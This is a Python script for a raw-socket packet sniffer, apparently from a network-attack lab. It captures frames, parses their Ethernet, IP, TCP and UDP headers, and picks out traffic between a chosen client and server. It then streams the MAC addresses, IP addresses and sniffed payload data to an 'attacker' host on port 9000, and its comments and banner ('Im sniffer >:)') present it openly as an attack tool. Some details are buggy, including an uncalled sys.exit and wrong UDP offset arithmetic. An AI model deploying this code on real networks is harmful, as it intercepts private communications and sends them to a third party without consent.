import socket, sys
from datetime import datetime
from struct import *
import csv
from time import sleep


def eth_addr(a):
    mac = ""
    for val in a:
        grp = "{:2x}".format(val)
        grp = grp.replace(' ', '')
        if len(grp) == 1:
            mac = "{}0{}:".format(mac, grp)
        else:
            mac = "{}{}:".format(mac, grp)

    # print("MAC ADDRESS: {}\n".format(mac[:len(mac)-1]))
    return mac[:len(mac) - 1]


def open_socket():
    protocol_dict = {1: "ICMP", 6: "TCP", 17: "UDP", 2: "IGMP", 0: "HOPOPT", 168: "rsvd"}
    # https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml

    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        print("Listening socket creation successful........\n")
    except socket.error as err:
        print("Socket could not be created. Error code : {}".format(err))
        sys.exit
        
    client_ip = input("Enter IP address of client: ")
    server_ip = input("Enter IP address of server: ")
    
    attacker_ip = input("Enter IP address of attacker: ")       # connect to attacker
    a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a.connect((attacker_ip, 9000))

    while True:
        package, add = s.recvfrom(65535)

        # ================ Layer 2 Information - Data Link =======================

        # extract the first 14 bytes of the frame
        l2_header = package[:14]
        dest_mac, src_mac, proto = unpack('!6s 6s H', l2_header)
        dest_mac = eth_addr(dest_mac)
        src_mac = eth_addr(src_mac)
        eth_protocol = socket.htons(proto)
        l3_packet = package[14:]

        if (dest_mac == "ff:ff:ff:ff:ff:ff" or (src_mac == "0: 0: 0: 0: 0: 0")):
            continue

        # ================= Layer 3 Information - Network ==========================

        # extract the first 20 bytes from eth_payload for the IP header
        ip_header = l3_packet[:20]

        # unpacket the ip_header
        # check https://docs.python.org/2/library/struct.html#format-characters
        ipheader_unpack = unpack('!BBHHHBBH4s4s', ip_header)

        version_ihl = ipheader_unpack[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0x0F
        iph_length = ihl * 4

        ttl = ipheader_unpack[5]
        protocol = ipheader_unpack[6]
        source_addr = socket.inet_ntoa(ipheader_unpack[8])
        destination_addr = socket.inet_ntoa(ipheader_unpack[9])
        l4_segment = l3_packet[iph_length:]

        if (version != 4):
            continue

        # ======================= Layer 4 Information - Transport =================

        if (protocol_dict[protocol] == "ICMP"):
            icmp_header = l4_segment[:8]
            icmp_Data = l4_segment[8:]
            data_length = len(icmp_Data)

        elif (protocol_dict[protocol] == "IGMP"):
            continue

        elif (protocol_dict[protocol] == "HOPOPT"):
            continue

        elif (protocol_dict[protocol] == "TCP"):

            tcp_header = l4_segment[:20]
            tcph = unpack('!HHLLBBHHH', tcp_header)
            source_port = tcph[0]
            destin_port = tcph[1]
            seq_number = tcph[2]
            ack_number = tcph[3]
            reserve = tcph[4]
            tcph_len = reserve >> 4
            tcpData_start = tcph_len * 4
            rcv_Data = l4_segment[tcpData_start:]
            data_length = len(rcv_Data)
            
        elif (protocol_dict[protocol] == "UDP"):

            udp_header = l4_segment[:8]
            udph = unpack('!HHHH', udp_header)
            sourec_port = udph[0]
            destin_port = udph[1]
            udph_length = udph[2]
            udpData_start = udph_length * 4
            rcv_Data = l4_segment[udpData_start:]
            data_length = len(rcv_Data)
           
        else:
            continue

        if (client_ip in source_addr or server_ip in source_addr) and data_length > 0:
            
            if destination_addr == attacker_ip:
                continue
            
            msg = (
                f"Source MAC Address     : {src_mac}\n"
                f"Destination MAC Address: {dest_mac}\n"
                f"IP Protocol            : {protocol_dict[protocol]}\n"
                f"Source IP Address      : {source_addr}\n"
                f"Destination IP Address : {destination_addr}\n"
                f"{protocol_dict[protocol]} Data length         : {data_length}\n"
                f"Data Sniffed           : {rcv_Data}\n\n"
            )
            
            print(msg)
            
            try:                                                # send messages to attacker    
                a.sendall(msg.encode())
            except socket.error as err:
                print(f"Send failed: {err}")
            
if __name__ == '__main__':
    print("run 'ipconfig' (windows) or 'ip a' (linux) for IP address of machine.\n\n")
    print("Im sniffer >:)\n\n")
    
    open_socket()
